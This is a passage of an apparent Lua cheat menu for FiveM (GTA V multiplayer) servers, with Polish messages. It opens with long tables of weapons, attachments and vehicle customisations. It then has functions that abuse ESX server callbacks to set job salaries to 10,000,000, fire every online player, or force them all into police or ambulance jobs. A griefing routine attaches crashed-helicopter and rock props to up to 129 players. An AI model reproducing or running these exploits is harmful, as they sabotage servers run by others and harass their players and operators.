                        id = 'COMPONENT_AT_MG_BARREL_01'
                    },
                    {
                        name = '~h~~p~» ~w~Heavy',
                        id = 'COMPONENT_AT_MG_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~» ~w~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~p~» ~w~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~p~» ~w~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~p~» ~w~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~p~» ~w~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~p~» ~w~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~p~» ~w~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {
                        name = '~h~~p~» ~w~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP_02'
                    }
                }
            }
        },
        GusenbergSweeper = {
            id = 'weapon_gusenberg',
            name = '~h~~p~» ~w~GusenbergSweeper',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_GUSENBERG_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_GUSENBERG_CLIP_02'
                    }
                }
            }
        }
    },
    Snipers = {
        SniperRifle = {
            id = 'weapon_sniperrifle',
            name = '~h~~p~» ~w~Sniper Rifle',
            bInfAmmo = false,
            mods = {
                Sights = {
                    {
                        name = '~h~~p~» ~w~Scope',
                        id = 'COMPONENT_AT_SCOPE_LARGE'
                    },
                    {
                        name = '~h~~p~» ~w~Advanced Scope',
                        id = 'COMPONENT_AT_SCOPE_MAX'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                }
            }
        },
        HeavySniper = {
            id = 'weapon_heavysniper',
            name = '~h~~p~» ~w~Heavy Sniper',
            bInfAmmo = false,
            mods = {
                Sights = {
                    {
                        name = '~h~~p~» ~w~Scope',
                        id = 'COMPONENT_AT_SCOPE_LARGE'
                    },
                    {
                        name = '~h~~p~» ~w~Advanced Scope',
                        id = 'COMPONENT_AT_SCOPE_MAX'
                    }
                }
            }
        },
        HeavySniperMkII = {
            id = 'weapon_heavysniper_mk2',
            name = '~h~~p~» ~w~Heavy Sniper Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~p~» ~w~Incendiary Rounds',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~p~» ~w~Armor Piercing Rounds',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~p~» ~w~FMJ Rounds',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_FMJ'
                    },
                    {
                        name = '~h~~p~» ~w~Explosive Rounds',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_EXPLOSIVE'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~» ~w~Zoom Scope',
                        id = 'COMPONENT_AT_SCOPE_LARGE_MK2'
                    },
                    {
                        name = '~h~~p~» ~w~Advanced Scope',
                        id = 'COMPONENT_AT_SCOPE_MAX'
                    },
                    {
                        name = '~h~~p~» ~w~Nigt Vision Scope',
                        id = 'COMPONENT_AT_SCOPE_NV'
                    },
                    {
                        name = '~h~~p~» ~w~Thermal Scope',
                        id = 'COMPONENT_AT_SCOPE_THERMAL'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~p~» ~w~Default',
                        id = 'COMPONENT_AT_SR_BARREL_01'
                    },
                    {
                        name = '~h~~p~» ~w~Heavy',
                        id = 'COMPONENT_AT_SR_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~» ~w~Suppressor',
                        id = 'COMPONENT_AT_SR_SUPP_03'
                    },
                    {
                        name = '~h~~p~» ~w~Squared Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_08'
                    },
                    {
                        name = '~h~~p~» ~w~Bell-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_09'
                    }
                }
            }
        },
        MarksmanRifle = {
            id = 'weapon_marksmanrifle',
            name = '~h~~p~» ~w~Marksman Rifle',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_MARKSMANRIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_MARKSMANRIFLE_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~» ~w~Scope',
                        id = 'COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    }
                },
                Grips = {
                    {
                        name = '~h~~p~» ~w~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        MarksmanRifleMkII = {
            id = 'weapon_marksmanrifle_mk2',
            name = '~h~~p~» ~w~Marksman Rifle Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~p~» ~w~Tracer Rounds',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~p~» ~w~Incendiary Rounds',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~p~» ~w~Hollow Point Rounds',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~p~» ~w~FMJ Rounds',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_FMJ	'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~» ~w~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~p~» ~w~Large Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                    },
                    {
                        name = '~h~~p~» ~w~Zoom Scope',
                        id = 'COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~p~» ~w~Default',
                        id = 'COMPONENT_AT_MRFL_BARREL_01'
                    },
                    {
                        name = '~h~~p~» ~w~Heavy',
                        id = 'COMPONENT_AT_MRFL_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    },
                    {
                        name = '~h~~p~» ~w~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~p~» ~w~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~p~» ~w~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~p~» ~w~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~p~» ~w~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~p~» ~w~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~p~» ~w~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {
                        name = '~h~~p~» ~w~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP_02'
                    }
                }
            }
        }
    },
    Heavy = {
        RPG = {
            id = 'weapon_rpg',
            name = '~h~~p~» ~w~RPG',
            bInfAmmo = false,
            mods = {}
        },
        GrenadeLauncher = {
            id = 'weapon_grenadelauncher',
            name = '~h~~p~» ~w~Grenade Launcher',
            bInfAmmo = false,
            mods = {}
        },
        GrenadeLauncherSmoke = {
            id = 'weapon_grenadelauncher_smoke',
            name = '~h~~p~» ~w~Grenade Launcher Smoke',
            bInfAmmo = false,
            mods = {}
        },
        Minigun = {
            id = 'weapon_minigun',
            name = '~h~~p~» ~w~Minigun',
            bInfAmmo = false,
            mods = {}
        },
        FireworkLauncher = {
            id = 'weapon_firework',
            name = '~h~~p~» ~w~Firework Launcher',
            bInfAmmo = false,
            mods = {}
        },
        Railgun = {
            id = 'weapon_railgun',
            name = '~h~~p~» ~w~Railgun',
            bInfAmmo = false,
            mods = {}
        },
        HomingLauncher = {
            id = 'weapon_hominglauncher',
            name = '~h~~p~» ~w~Homing Launcher',
            bInfAmmo = false,
            mods = {}
        },
        CompactGrenadeLauncher = {
            id = 'weapon_compactlauncher',
            name = '~h~~p~» ~w~Compact Grenade Launcher',
            bInfAmmo = false,
            mods = {}
        },
        Widowmaker = {
            id = 'weapon_rayminigun',
            name = '~h~~p~» ~w~Widowmaker',
            bInfAmmo = false,
            mods = {}
        }
    },
    Throwables = {
        Grenade = {
            id = 'weapon_grenade',
            name = '~h~~p~» ~w~Grenade',
            bInfAmmo = false,
            mods = {}
        },
        BZGas = {
            id = 'weapon_bzgas',
            name = '~h~~p~» ~w~BZ Gas',
            bInfAmmo = false,
            mods = {}
        },
        MolotovCocktail = {
            id = 'weapon_molotov',
            name = '~h~~p~» ~w~Molotov Cocktail',
            bInfAmmo = false,
            mods = {}
        },
        StickyBomb = {
            id = 'weapon_stickybomb',
            name = '~h~~p~» ~w~Sticky Bomb',
            bInfAmmo = false,
            mods = {}
        },
        ProximityMines = {
            id = 'weapon_proxmine',
            name = '~h~~p~» ~w~Proximity Mines',
            bInfAmmo = false,
            mods = {}
        },
        Snowballs = {
            id = 'weapon_snowball',
            name = '~h~~p~» ~w~Snowballs',
            bInfAmmo = false,
            mods = {}
        },
        PipeBombs = {
            id = 'weapon_pipebomb',
            name = '~h~~p~» ~w~Pipe Bombs',
            bInfAmmo = false,
            mods = {}
        },
        Baseball = {
            id = 'weapon_ball',
            name = '~h~~p~» ~w~Baseball',
            bInfAmmo = false,
            mods = {}
        },
        TearGas = {
            id = 'weapon_smokegrenade',
            name = '~h~~p~» ~w~Tear Gas',
            bInfAmmo = false,
            mods = {}
        },
        Flare = {
            id = 'weapon_flare',
            name = '~h~~p~» ~w~Flare',
            bInfAmmo = false,
            mods = {}
        }
    },
    Misc = {
        Parachute = {
            id = 'gadget_parachute',
            name = '~h~~p~» ~w~Parachute',
            bInfAmmo = false,
            mods = {}
        },
        FireExtinguisher = {
            id = 'weapon_fireextinguisher',
            name = '~h~~p~» ~w~Fire Extinguisher',
            bInfAmmo = false,
            mods = {}
        }
    }
}
local b8 = false
local b9 = false
local ba = false
local bb = false
local bc = nil
local bd = {}
local be = {}
local bf = nil
local bg = false
local bh = -1
local bi = -1
local bj = -1
local bk = false
local bl = {
    {
        name = '~h~Spoilers',
        id = 0
    },
    {
        name = '~h~Front Bumper',
        id = 1
    },
    {
        name = '~h~Rear Bumper',
        id = 2
    },
    {
        name = '~h~Side Skirt',
        id = 3
    },
    {
        name = '~h~Exhaust',
        id = 4
    },
    {
        name = '~h~Frame',
        id = 5
    },
    {
        name = '~h~Grille',
        id = 6
    },
    {
        name = '~h~Hood',
        id = 7
    },
    {
        name = '~h~Fender',
        id = 8
    },
    {
        name = '~h~Right Fender',
        id = 9
    },
    {
        name = '~h~Roof',
        id = 10
    },
    {
        name = '~h~Vanity Plates',
        id = 25
    },
    {
        name = '~h~Trim',
        id = 27
    },
    {
        name = '~h~Ornaments',
        id = 28
    },
    {
        name = '~h~Dashboard',
        id = 29
    },
    {
        name = '~h~Dial',
        id = 30
    },
    {
        name = '~h~Door Speaker',
        id = 31
    },
    {
        name = '~h~Seats',
        id = 32
    },
    {
        name = '~h~Steering Wheel',
        id = 33
    },
    {
        name = '~h~Shifter Leavers',
        id = 34
    },
    {
        name = '~h~Plaques',
        id = 35
    },
    {
        name = '~h~Speakers',
        id = 36
    },
    {
        name = '~h~Trunk',
        id = 37
    },
    {
        name = '~h~Hydraulics',
        id = 38
    },
    {
        name = '~h~Engine Block',
        id = 39
    },
    {
        name = '~h~Air Filter',
        id = 40
    },
    {
        name = '~h~Struts',
        id = 41
    },
    {
        name = '~h~Arch Cover',
        id = 42
    },
    {
        name = '~h~Aerials',
        id = 43
    },
    {
        name = '~h~Trim 2',
        id = 44
    },
    {
        name = '~h~Tank',
        id = 45
    },
    {
        name = '~h~Windows',
        id = 46
    },
    {
        name = '~h~Livery',
        id = 48
    },
    {
        name = '~h~Horns',
        id = 14
    },
    {
        name = '~h~Wheels',
        id = 23
    },
    {
        name = '~h~Wheel Types',
        id = 'wheeltypes'
    },
    {
        name = '~h~Extras',
        id = 'extra'
    },
    {
        name = '~h~Neons',
        id = 'neon'
    },
    {
        name = '~h~Paint',
        id = 'paint'
    },
    {
        name = '~h~Headlights Color',
        id = 'headlight'
    },
    {
        name = '~h~Licence Plate',
        id = 'licence'
    }
}
local bm = {
    {
        name = '~h~~r~Engine',
        id = 11
    },
    {
        name = '~h~~w~Brakes',
        id = 12
    },
    {
        name = '~h~~g~Transmission',
        id = 13
    },
    {
        name = '~h~~y~Suspension',
        id = 15
    },
    {
        name = '~h~~w~Armor',
        id = 16
    }
}
local bn = {
    {
        name = '~h~Blue on White 2',
        id = 0
    },
    {
        name = '~h~Blue on White 3',
        id = 4
    },
    {
        name = '~h~Yellow on Blue',
        id = 2
    },
    {
        name = '~h~Yellow on Black',
        id = 1
    },
    {
        name = '~h~North Yankton',
        id = 5
    }
}
local bo = {
    {
        name = '~h~Default',
        id = -1
    },
    {
        name = '~h~White',
        id = 0
    },
    {
        name = '~h~Blue',
        id = 1
    },
    {
        name = '~h~Electric Blue',
        id = 2
    },
    {
        name = '~h~Mint Green',
        id = 3
    },
    {
        name = '~h~Lime Green',
        id = 4
    },
    {
        name = '~h~Yellow',
        id = 5
    },
    {
        name = '~h~Golden Shower',
        id = 6
    },
    {
        name = '~h~Orange',
        id = 7
    },
    {
        name = '~h~Red',
        id = 8
    },
    {
        name = '~h~Pony Pink',
        id = 9
    },
    {
        name = '~h~Hot Pink',
        id = 10
    },
    {
        name = '~h~Purple',
        id = 11
    },
    {
        name = '~h~Blacklight',
        id = 12
    }
}
local bp = {
    ['Stock Horn'] = -1,
    ['Truck Horn'] = 1,
    ['Police Horn'] = 2,
    ['Clown Horn'] = 3,
    ['Musical Horn 1'] = 4,
    ['Musical Horn 2'] = 5,
    ['Musical Horn 3'] = 6,
    ['Musical Horn 4'] = 7,
    ['Musical Horn 5'] = 8,
    ['Sad Trombone Horn'] = 9,
    ['Classical Horn 1'] = 10,
    ['Classical Horn 2'] = 11,
    ['Classical Horn 3'] = 12,
    ['Classical Horn 4'] = 13,
    ['Classical Horn 5'] = 14,
    ['Classical Horn 6'] = 15,
    ['Classical Horn 7'] = 16,
    ['Scaledo Horn'] = 17,
    ['Scalere Horn'] = 18,
    ['Salemi Horn'] = 19,
    ['Scalefa Horn'] = 20,
    ['Scalesol Horn'] = 21,
    ['Scalela Horn'] = 22,
    ['Scaleti Horn'] = 23,
    ['Scaledo Horn High'] = 24,
    ['Jazz Horn 1'] = 25,
    ['Jazz Horn 2'] = 26,
    ['Jazz Horn 3'] = 27,
    ['Jazz Loop Horn'] = 28,
    ['Starspangban Horn 1'] = 28,
    ['Starspangban Horn 2'] = 29,
    ['Starspangban Horn 3'] = 30,
    ['Starspangban Horn 4'] = 31,
    ['Classical Loop 1'] = 32,
    ['Classical Horn 8'] = 33,
    ['Classical Loop 2'] = 34
}
local bq = {
    ['White'] = {
        255,
        255,
        255
    },
    ['Blue'] = {
        0,
        0,
        255
    },
    ['Electric Blue'] = {
        0,
        150,
        255
    },
    ['Mint Green'] = {
        50,
        255,
        155
    },
    ['Lime Green'] = {
        0,
        255,
        0
    },
    ['Yellow'] = {
        255,
        255,
        0
    },
    ['Golden Shower'] = {
        204,
        204,
        0
    },
    ['Orange'] = {
        255,
        128,
        0
    },
    ['Red'] = {
        255,
        0,
        0
    },
    ['Pony Pink'] = {
        255,
        102,
        255
    },
    ['Hot Pink'] = {
        255,
        0,
        255
    },
    ['Purple'] = {
        153,
        0,
        153
    }
}
local br = {
    {
        name = '~h~Black',
        id = 0
    },
    {
        name = '~h~Carbon Black',
        id = 147
    },
    {
        name = '~h~Graphite',
        id = 1
    },
    {
        name = '~h~Anhracite Black',
        id = 11
    },
    {
        name = '~h~Black Steel',
        id = 2
    },
    {
        name = '~h~Dark Steel',
        id = 3
    },
    {
        name = '~h~Silver',
        id = 4
    },
    {
        name = '~h~Bluish Silver',
        id = 5
    },
    {
        name = '~h~Rolled Steel',
        id = 6
    },
    {
        name = '~h~Shadow Silver',
        id = 7
    },
    {
        name = '~h~Stone Silver',
        id = 8
    },
    {
        name = '~h~Midnight Silver',
        id = 9
    },
    {
        name = '~h~Cast Iron Silver',
        id = 10
    },
    {
        name = '~h~Red',
        id = 27
    },
    {
        name = '~h~Torino Red',
        id = 28
    },
    {
        name = '~h~Formula Red',
        id = 29
    },
    {
        name = '~h~Lava Red',
        id = 150
    },
    {
        name = '~h~Blaze Red',
        id = 30
    },
    {
        name = '~h~Grace Red',
        id = 31
    },
    {
        name = '~h~Garnet Red',
        id = 32
    },
    {
        name = '~h~Sunset Red',
        id = 33
    },
    {
        name = '~h~Cabernet Red',
        id = 34
    },
    {
        name = '~h~Wine Red',
        id = 143
    },
    {
        name = '~h~Candy Red',
        id = 35
    },
    {
        name = '~h~Hot Pink',
        id = 135
    },
    {
        name = '~h~Pfsiter Pink',
        id = 137
    },
    {
        name = '~h~Salmon Pink',
        id = 136
    },
    {
        name = '~h~Sunrise Orange',
        id = 36
    },
    {
        name = '~h~Orange',
        id = 38
    },
    {
        name = '~h~Bright Orange',
        id = 138
    },
    {
        name = '~h~Gold',
        id = 99
    },
    {
        name = '~h~Bronze',
        id = 90
    },
    {
        name = '~h~Yellow',
        id = 88
    },
    {
        name = '~h~Race Yellow',
        id = 89
    },
    {
        name = '~h~Dew Yellow',
        id = 91
    },
    {
        name = '~h~Dark Green',
        id = 49
    },
    {
        name = '~h~Racing Green',
        id = 50
    },
    {
        name = '~h~Sea Green',
        id = 51
    },
    {
        name = '~h~Olive Green',
        id = 52
    },
    {
        name = '~h~Bright Green',
        id = 53
    },
    {
        name = '~h~Gasoline Green',
        id = 54
    },
    {
        name = '~h~Lime Green',
        id = 92
    },
    {
        name = '~h~Midnight Blue',
        id = 141
    },
    {
        name = '~h~Galaxy Blue',
        id = 61
    },
    {
        name = '~h~Dark Blue',
        id = 62
    },
    {
        name = '~h~Saxon Blue',
        id = 63
    },
    {
        name = '~h~Blue',
        id = 64
    },
    {
        name = '~h~Mariner Blue',
        id = 65
    },
    {
        name = '~h~Harbor Blue',
        id = 66
    },
    {
        name = '~h~Diamond Blue',
        id = 67
    },
    {
        name = '~h~Surf Blue',
        id = 68
    },
    {
        name = '~h~Nautical Blue',
        id = 69
    },
    {
        name = '~h~Racing Blue',
        id = 73
    },
    {
        name = '~h~Ultra Blue',
        id = 70
    },
    {
        name = '~h~Light Blue',
        id = 74
    },
    {
        name = '~h~Chocolate Brown',
        id = 96
    },
    {
        name = '~h~Bison Brown',
        id = 101
    },
    {
        name = '~h~Creeen Brown',
        id = 95
    },
    {
        name = '~h~Feltzer Brown',
        id = 94
    },
    {
        name = '~h~Maple Brown',
        id = 97
    },
    {
        name = '~h~Beechwood Brown',
        id = 103
    },
    {
        name = '~h~Sienna Brown',
        id = 104
    },
    {
        name = '~h~Saddle Brown',
        id = 98
    },
    {
        name = '~h~Moss Brown',
        id = 100
    },
    {
        name = '~h~Woodbeech Brown',
        id = 102
    },
    {
        name = '~h~Straw Brown',
        id = 99
    },
    {
        name = '~h~Sandy Brown',
        id = 105
    },
    {
        name = '~h~Bleached Brown',
        id = 106
    },
    {
        name = '~h~Schafter Purple',
        id = 71
    },
    {
        name = '~h~Spinnaker Purple',
        id = 72
    },
    {
        name = '~h~Midnight Purple',
        id = 142
    },
    {
        name = '~h~Bright Purple',
        id = 145
    },
    {
        name = '~h~Cream',
        id = 107
    },
    {
        name = '~h~Ice White',
        id = 111
    },
    {
        name = '~h~Frost White',
        id = 112
    }
}
local bt = {
    {
        name = '~h~Black',
        id = 12
    },
    {
        name = '~h~Gray',
        id = 13
    },
    {
        name = '~h~Light Gray',
        id = 14
    },
    {
        name = '~h~Ice White',
        id = 131
    },
    {
        name = '~h~Blue',
        id = 83
    },
    {
        name = '~h~Dark Blue',
        id = 82
    },
    {
        name = '~h~Midnight Blue',
        id = 84
    },
    {
        name = '~h~Midnight Purple',
        id = 149
    },
    {
        name = '~h~Schafter Purple',
        id = 148
    },
    {
        name = '~h~Red',
        id = 39
    },
    {
        name = '~h~Dark Red',
        id = 40
    },
    {
        name = '~h~Orange',
        id = 41
    },
    {
        name = '~h~Yellow',
        id = 42
    },
    {
        name = '~h~Lime Green',
        id = 55
    },
    {
        name = '~h~Green',
        id = 128
    },
    {
        name = '~h~Forest Green',
        id = 151
    },
    {
        name = '~h~Foliage Green',
        id = 155
    },
    {
        name = '~h~Olive Darb',
        id = 152
    },
    {
        name = '~h~Dark Earth',
        id = 153
    },
    {
        name = '~h~Desert Tan',
        id = 154
    }
}
local bu = {
    {
        name = '~h~Brushed Steel',
        id = 117
    },
    {
        name = '~h~Brushed Black Steel',
        id = 118
    },
    {
        name = '~h~Brushed Aluminum',
        id = 119
    },
    {
        name = '~h~Pure Gold',
        id = 158
    },
    {
        name = '~h~Brushed Gold',
        id = 159
    }
}

if GetVehiclePedIsUsing(PlayerPedId()) then
    veh = GetVehiclePedIsUsing(PlayerPedId())
end
local bv = false
local bw = true
local bx = GetPlayerServerId(PlayerPedId(-1))
local by = GetPlayerName(bx)
av('~h~Aby odpalic - na numpadzie ', true)
av ('beziu ulana kurwa † ', true)
av ('' .. GetPlayerName(PlayerId(-1)) .. ' Uwielbia KoGuSzKa', true)
local function xde(I, x, y)
    SetTextFont(7)
    SetTextProportional(8)
    SetTextScale(0.2, 0.2)
    SetTextDropshadow(1, 0, 0, 0, 255)
    SetTextEdge(1, 150, 150, 0, 255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry('STRING')
    AddTextComponentString(I)
    DrawText(x, y)
end
local function bz(I, x, y)
    SetTextFont(7)
    SetTextProportional(3)
    SetTextScale(0.0, 0.2)
    SetTextDropshadow(1, 0, 0, 0, 255)
    SetTextEdge(1, 150, 150, 0, 255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry('STRING')
    AddTextComponentString(I)
    DrawText(x, y)
end

function pizdaSync(bA)
    local bB = GetHashKey(bA)
    pizda(bB)
    while not HasModelLoaded(bB) do
        pizda(bB)
        Citizen.Wait(0)
    end
end

function EconomyDestroySalary1()
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'police',
            0,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'mecano',
            0,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'ambulance',
            0,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'realestateagent',
            0,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'cardealer',
            0,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'police',
            1,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'mecano',
            1,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'ambulance',
            1,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'realestateagent',
            1,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'cardealer',
            1,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'police',
            2,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'mecano',
            2,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'ambulance',
            2,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'realestateagent',
            2,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'cardealer',
            2,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'police',
            3,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'mecano',
            3,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'ambulance',
            3,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'realestateagent',
            3,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'cardealer',
            3,
            10000000
        )
    end
end

function UnemployedPlayers()
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(as)
                for i = 1, #as, 1 do
                    label = as[i].name
                    value = as[i].source
                    name = as[i].name
                    identifier = as[i].identifier
                    ESX.TriggerServerCallback(
                        'esx_society:setJob',
                        function()
                        end,
                        identifier,
                        'unemployed',
                        0,
                        'fire'
                    )
                end
            end
        )
    end
end

function AmbulancePlayers()
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(as)
                for i = 1, #as, 1 do
                    label = as[i].name
                    value = as[i].source
                    name = as[i].name
                    identifier = as[i].identifier
                    ESX.TriggerServerCallback(
                        'esx_society:setJob',
                        function()
                        end,
                        identifier,
                        'ambulance',
                        3,
                        'hire'
                    )
                end
            end
        )
    end
end

function PolicePlayers()
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(as)
                for i = 1, #as, 1 do
                    label = as[i].name
                    value = as[i].source
                    name = as[i].name
                    identifier = as[i].identifier
                    ESX.TriggerServerCallback(
                        'esx_society:setJob',
                        function()
                        end,
                        identifier,
                        'police',
                        4,
                        'hire'
                    )
                end
            end
        )
    end
end

local cb = 0
local function TmEM1U()
	
    if cb == 3 then
        av("~h~Nieudane , koguszek menu wylaczone.")
        Citizen.Wait(5000)
        ForceSocialClubUpdate()
	
    else
        local triggerr = KeyboardInput('Wpisz haslo', '', 100)
        if triggerr == "TriggerServerEvent" then
            triggerr = true
            PlaySoundFrontend(-1, 'PICK_UP', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
            Citizen.Wait(100)
            PlaySoundFrontend(-1, 'PICK_UP', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
            Citizen.Wait(100)
            PlaySoundFrontend(-1, 'PICK_UP', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
        else
            cb = cb + 1
            av('~r~~h~Zle haslo idioto.')
            PlaySoundFrontend(-1, 'MP_WAVE_COMPLETE', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
			PlaySoundFrontend(-1, 'MP_WAVE_COMPLETE', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
			PlaySoundFrontend(-1, 'MP_WAVE_COMPLETE', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
			PlaySoundFrontend(-1, 'MP_WAVE_COMPLETE', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
			PlaySoundFrontend(-1, 'MP_WAVE_COMPLETE', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
        end
    end
end



function bananapartyall()
    Citizen.CreateThread(
        function()
            --[[for bD = 0, 9 do
                TriggerServerEvent(
                    '_chat:messageEntered',
                    '^1A^2l^3p^4h^5a^6V^7e^1t^2a',
                    {
                        141,
                        211,
                        255
                    },
                    '^' .. bD .. 'AlphaV ~ 5391'
                )
            end--]]
            for i = 0, 128 do
                local bH = CreateObject(GetHashKey('p_crahsed_heli_s'), 0, 0, 0, true, true, true)
                local bI = CreateObject(GetHashKey('prop_rock_4_big2'), 0, 0, 0, true, true, true)
                local bJ = CreateObject(GetHashKey('prop_beachflag_le'), 0, 0, 0, true, true, true)
                AttachEntityToEntity(
                    bH,
                    GetPlayerPed(i),
